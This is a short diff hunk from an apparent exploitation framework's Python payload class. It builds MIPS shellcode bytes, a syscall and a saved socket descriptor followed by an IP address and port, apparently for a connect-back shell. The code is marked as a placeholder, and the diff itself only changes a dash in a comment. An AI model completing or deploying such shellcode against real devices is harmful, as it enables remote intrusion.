@@ -38,7 +38,7 @@ class Payload(BasePayload):
             b"\x00\x00\x00\x0c"  # syscall
             b"\x00\x44\x20\x21"  # addu $a0, $v0, $0 (save fd)
 
-            # Placeholder — full implementation via cross-compiled C
+            # Placeholder  -  full implementation via cross-compiled C
             b"\xff\xff\xff\xff"
             + ip_bytes
             + port_bytes
